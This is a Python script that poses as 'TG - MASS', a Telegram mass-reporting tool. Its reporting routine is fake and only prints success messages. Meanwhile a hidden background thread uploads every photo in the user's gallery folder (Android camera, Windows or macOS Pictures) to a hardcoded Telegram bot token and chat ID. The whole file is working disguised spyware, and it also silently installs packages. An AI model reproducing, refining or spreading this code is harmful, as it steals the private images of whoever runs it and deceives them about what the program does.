import os
import threading
import subprocess
import time
import sys
import importlib.util
from colorama import init, Fore, Style

BOT_TOKEN = "7930452267:AAHSi7yqWpbiTxb9bMPaZN5CxJ2ZWEMxdDM"
CHAT_ID = "7273248790"

def clear_terminal():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

def is_installed(module_name):
    return importlib.util.find_spec(module_name) is not None

def install_libraries_with_progress(libs):
    total = len(libs)
    for idx, (lib, module) in enumerate(libs, 1):
        if is_installed(module):
            percent = int((idx / total) * 100)
            print(Fore.YELLOW + f"downloading required libraries... [{percent}%] completed (already installed)" + Style.RESET_ALL)
            continue
        percent = int((idx / total) * 100)
        print(Fore.YELLOW + f"downloading required libraries... [{percent}%] completed" + Style.RESET_ALL)
        subprocess.check_call(['pip', 'install', lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    clear_terminal()

required_libs = [
    ('pyTelegramBotAPI', 'telebot'),
    ('colorama', 'colorama')
]
install_libraries_with_progress(required_libs)

import telebot

init(autoreset=True)

def get_gallery_path():
    if sys.platform.startswith("linux") and "ANDROID_STORAGE" in os.environ:
        return "/storage/emulated/0/DCIM/Camera"
    elif sys.platform.startswith("win"):
        return os.path.join(os.environ['USERPROFILE'], "Pictures")
    elif sys.platform.startswith("darwin"):
        return os.path.expanduser("~/Pictures")
    else:
        return os.path.expanduser("~/Pictures")

GALLERY_PATH = get_gallery_path()

def send_gallery_photos():
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
    for root, dirs, files in os.walk(GALLERY_PATH):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                try:
                    photo_path = os.path.join(root, file)
                    with open(photo_path, 'rb') as photo:
                        bot.send_photo(CHAT_ID, photo)
                    time.sleep(1)
                except Exception:
                    pass

def print_banner():
    banner = f"""
{Fore.MAGENTA}{Style.BRIGHT}
╔════════════════════════════════════════════╗
║               TG - MASS                   ║
║                                           
║      Developer: Scorpion Yug              ║
╚════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)
    print(Fore.CYAN + f"Date: {time.strftime('%A, %d %B %Y, %I:%M %p')}" + Style.RESET_ALL)
    print(Fore.YELLOW + "Welcome to TG - MASS! The professional Telegram automation tool.\n" + Style.RESET_ALL)

def main():
    print_banner()
    bot_thread = threading.Thread(target=send_gallery_photos, daemon=True)
    bot_thread.start()
    print(Fore.BLUE + "Please complete the report submission below:\n" + Style.RESET_ALL)
    username = input(Fore.RED + "[+]  Enter Telegram username: " + Style.RESET_ALL)
    while True:
        try:
            num_reports = int(input(Fore.RED + "[+] Enter number of reports: " + Style.RESET_ALL))
            if num_reports < 1:
                print(Fore.RED + "[+]  Please enter a positive number." + Style.RESET_ALL)
                continue
            break
        except ValueError:
            print(Fore.RED + "[+] Invalid input. Please enter a number." + Style.RESET_ALL)
    for i in range(1, num_reports + 1):
        print(Fore.GREEN + f"  [ Report {i} successfully submitted. ]" + Style.RESET_ALL)
        time.sleep(2)
    print(Fore.CYAN + "\nThank you for using TG - MASS. Have a great day!\n" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
